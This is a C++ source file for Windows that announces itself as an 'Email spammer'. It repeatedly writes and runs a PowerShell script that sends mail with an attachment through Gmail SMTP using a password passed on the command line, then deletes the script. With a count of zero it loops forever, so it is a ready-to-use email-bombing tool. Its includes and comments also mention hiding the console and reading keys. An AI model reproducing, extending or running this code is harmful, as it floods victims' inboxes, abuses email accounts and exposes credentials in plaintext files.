#include <iostream>
#include <windows.h>  //For hiding/show console
#include <winuser.h>  //For reading keys
#include <ctime>      //For gettime function
#include <fstream>    //For file handling   
#include <string>     //Manipulating strings
#include <Lmcons.h>
#include <dir.h>
#include <sstream>
#include<conio.h>
#include<stdio.h>   //Used to get user name.
using namespace std;
string location;
void createpsfile (string gmail,string message, string numberofmessages,string password, string subject,string mailto,string emailer,string filename)
{
	ofstream myfile;
	string command="Emailer"+emailer+".ps1";
    myfile.open (command.c_str());
    myfile << "$location = ($PSCommandPath).trim(\"Emailer"+emailer+".ps1\")"<<endl;
    myfile << "$location = $location +\""+filename+"""\""<<endl;
    myfile << "$Body = \""+message+"\""<<endl;
    myfile << "$SmtpServer = 'smtp.gmail.com' "<<endl;
    myfile << "$SmtpUser = '"+gmail+"'"<<endl;
    myfile << "$smtpPassword = '"+password+"'"<<endl;
    myfile << "$MailtTo = '"+mailto+"'"<<endl;
    myfile << "$MailFrom = '"+gmail+"'"<<endl;
    myfile << "$MailSubject = \""+subject+emailer+" -"+numberofmessages+"\""<<endl;
    myfile << "$Credentials = New-Object System.Management.Automation.PSCredential -ArgumentList $SmtpUser, $($smtpPassword |"<<endl;
    myfile << "ConvertTo-SecureString -AsPlainText -Force)"<<endl;
    myfile << "Send-MailMessage -To \"$MailtTo\" -from \"$MailFrom\" -Subject $MailSubject -Body \"$Body\"-Attachments $location -SmtpServer $SmtpServer -BodyAsHtml -UseSsl -Credential $Credentials  "<<endl;
    myfile << "write-Output \"Email Sent\""<<endl;
  myfile.close();
  }
  
void getlocation (void)  //Gets the location from where the file is placed.
   {
		char tuh[_MAX_PATH];
char *abc;
abc=getcwd(tuh,sizeof(tuh));
location=abc;
   }
   
 
    void ShowConsole() //Shows Console (windows.h)
   {
    ::ShowWindow(::GetConsoleWindow(), SW_SHOW);
   }
main(int argc, char *argv[])
{
	getlocation();
	
	ofstream myfile2;
  
	cout<<"Email spammer!! \n\n";
	string gmail,message,password,subject,is,mailto,numbers,emailer,filename;
	int number;
	gmail=argv[1];
	password=argv[2];	
	mailto=argv[3];
    subject=argv[4];
	message=argv[5];
	numbers=argv[6];
	emailer=argv[7];
	filename=argv[8];
	if (filename=="la.txt")
	{
	myfile2.open ("la.txt");
    myfile2.close();
    }
	stringstream umber;
	umber<<numbers;
	umber>>number;
	umber.clear();
	ShowConsole();


	if (number==0)
	{
		int i;
		while (true)
		{
		stringstream obj;
     	obj<<i;
    	obj>>is;
     	obj.clear();
		createpsfile(gmail,message,is,password,subject,mailto,emailer,filename);
        string sendcom="sender.exe "+ emailer;
	    system(sendcom.c_str());
		string deletecommand = "cd "+location;
	    system(deletecommand.c_str());
	    string command2="del Emailer"+emailer+".ps1";
	    system(command2.c_str());
	    i++;
		}
		
		
	}
	else
	{
	for (int i = 1 ; i<=number; i++)
	{
		stringstream obj;
     	obj<<i;
    	obj>>is;
     	obj.clear();
		createpsfile(gmail,message,is,password,subject,mailto,emailer,filename);
	    string sendcom="sender.exe  "+ emailer;
	    system(sendcom.c_str());
		string deletecommand = "cd "+location;
	    system(deletecommand.c_str());
	    string command6="del Emailer"+emailer+".ps1";
	    system(command6.c_str());

		
	}
}

}
	

